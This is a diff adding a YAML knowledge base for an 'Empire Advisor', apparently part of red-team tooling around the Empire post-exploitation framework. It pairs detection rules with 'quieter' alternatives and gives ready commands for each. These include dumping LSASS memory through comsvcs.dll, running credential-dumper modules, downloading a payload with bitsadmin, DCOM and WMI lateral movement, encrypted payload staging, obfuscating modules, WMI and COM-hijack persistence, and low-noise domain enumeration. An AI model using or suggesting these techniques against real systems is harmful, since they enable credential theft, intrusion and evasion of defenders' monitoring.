@@ -1,0 +1,88 @@
+# Empire Advisor Knowledge Base
+# Maps rule violations to quieter alternative techniques
+# All suggestions require operator validation before use
+
+alternatives:
+  - rule_id: R001
+    suggestion: "Use process injection to reflectively load credential dumpers into legitimate processes"
+    kb_citation: "MITRE ATT&CK T1055 - Process Injection reduces standalone process indicators"
+    alternative_commands:
+      - "usemodule powershell/credentials/invoke_internal_monologue"
+      - "# Alternative: Use Cobalt Strike execute-assembly with SafetyKatz in sacrificial process"
+
+  - rule_id: R002
+    suggestion: "Use BITS transfer or SMB copy from attacker-controlled share to avoid WebClient signatures"
+    kb_citation: "BITS jobs blend with legitimate Windows Update traffic; SMB copy from domain share mimics admin file distribution"
+    alternative_commands:
+      - "bitsadmin /transfer update_job /priority high https://example.com/payload.ps1 C:\\Windows\\Temp\\update.ps1"
+      - "copy \\\\dc01.corp.local\\sysvol\\scripts\\payload.ps1 C:\\Windows\\Temp\\"
+
+  - rule_id: R003
+    suggestion: "Dump LSASS process memory to disk, exfiltrate, parse offline with pypykatz or mimikatz locally"
+    kb_citation: "Indirect access via process dump + offline parsing avoids in-memory AMSI and reduces dwell time"
+    alternative_commands:
+      - "usemodule powershell/credentials/powerdump"
+      - "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).Id C:\\Windows\\Temp\\debug.bin full"
+
+  - rule_id: R004
+    suggestion: "Rename functions and variables in PowerSploit modules before staging; use Invoke-Obfuscation for variable/function layers"
+    kb_citation: "Static signature evasion via symbol renaming; Empire supports custom module loading"
+    alternative_commands:
+      - "# Manually obfuscate PowerSploit module before loading into Empire as custom module"
+      - "usemodule powershell/management/invoke_script"
+
+  - rule_id: R005
+    suggestion: "Use DCOM lateral movement via MMC20.Application or ShellWindows instead of WMI process creation"
+    kb_citation: "DCOM execution blends with legitimate COM traffic; fewer behavioral signatures than WMI Win32_Process"
+    alternative_commands:
+      - "usemodule powershell/lateral_movement/invoke_dcom"
+      - "$com = [Activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application','target.host')); $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c payload',7)"
+
+  - rule_id: R006
+    suggestion: "Use WMI lateral movement or RDP with stolen credentials to avoid PsExec named pipe signatures"
+    kb_citation: "WMI event consumers or RDP sessions generate different telemetry; no psexecsvc artifact"
+    alternative_commands:
+      - "usemodule powershell/lateral_movement/invoke_wmi"
+      - "usemodule powershell/lateral_movement/invoke_psremoting"
+
+  - rule_id: R007
+    suggestion: "Stage payloads to disk encrypted, decrypt with hardcoded key, use dot-sourcing instead of IEX"
+    kb_citation: "Dot-sourcing (. script.ps1) executes without IEX string; encryption avoids static content inspection"
+    alternative_commands:
+      - ". C:\\Windows\\Temp\\update.ps1"
+      - "Get-Content payload.enc | ConvertFrom-SecureString -Key $key | . ([ScriptBlock]::Create($_))"
+
+  - rule_id: R008
+    suggestion: "Use WMI event consumer persistence or COM hijacking to avoid Run key monitoring"
+    kb_citation: "WMI persistence survives reboots with lower visibility than Run keys; COM hijacking leverages legitimate execution flow"
+    alternative_commands:
+      - "usemodule powershell/persistence/elevated/wmi"
+      - "usemodule powershell/persistence/userland/hijack_com"
+
+  - rule_id: R009
+    suggestion: "Create scheduled task via PowerShell ScheduledTasks module or COM interface to avoid schtasks.exe telemetry"
+    kb_citation: "ScheduledTasks PowerShell cmdlets generate different process tree; COM interface bypasses command-line logging"
+    alternative_commands:
+      - "Register-ScheduledTask -TaskName 'Update' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute 'powershell.exe' -Argument '-File C:\\update.ps1')"
+      - "usemodule powershell/persistence/elevated/schtasks"
+
+  - rule_id: R010
+    suggestion: "Use passive network mapping via ARP cache analysis or netstat instead of active port scanning"
+    kb_citation: "Passive reconnaissance avoids network anomalies; leverages existing host data"
+    alternative_commands:
+      - "Get-NetNeighbor | Where-Object {$_.State -eq 'Reachable'}"
+      - "netstat -ano | findstr ESTABLISHED"
+
+  - rule_id: R011
+    suggestion: "Use LDAP queries via PowerShell DirectorySearcher to avoid net.exe process telemetry"
+    kb_citation: "PowerShell LDAP queries blend with legitimate AD access; no net.exe command-line signature"
+    alternative_commands:
+      - "usemodule powershell/situational_awareness/network/powerview/get_domain_group"
+      - "$searcher = [adsisearcher]'(objectCategory=group)'; $searcher.FindAll()"
+
+  - rule_id: R012
+    suggestion: "Use targeted LDAP queries for specific objects instead of full domain enumeration; use stealthy collection timing"
+    kb_citation: "Throttled queries with specific filters reduce LDAP volume and behavioral alerts; avoid SharpHound default collectors"
+    alternative_commands:
+      - "SharpHound.exe -CollectionMethod Session -Throttle 5000 -Jitter 30"
+      - "usemodule powershell/situational_awareness/network/powerview/get_domain_controller"
